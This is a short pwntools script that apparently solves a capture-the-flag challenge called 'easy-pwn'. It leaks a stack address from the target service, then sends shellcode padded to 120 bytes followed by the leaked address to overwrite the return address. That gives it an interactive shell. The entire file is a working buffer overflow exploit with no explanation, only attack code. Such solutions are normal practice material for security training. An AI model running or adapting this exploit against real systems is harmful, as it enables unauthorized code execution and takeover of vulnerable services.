from pwn import *

elf = context.binary = ELF('./easy-pwn', checksec=False)
# sh = process('./easy-pwn')
sh = remote('0.0.0.0',15118)

sh.sendlineafter(b'>>', b'1')
leaked = eval(sh.recvuntil(b'x').strip(b'x'))
log.success(f'STACK --> {hex(leaked)}')

p = flat([
    asm(shellcraft.sh()),
    b'A' * (120 - len(asm(shellcraft.sh()))),
    leaked
])
sh.sendlineafter(b':', p)
sh.interactive()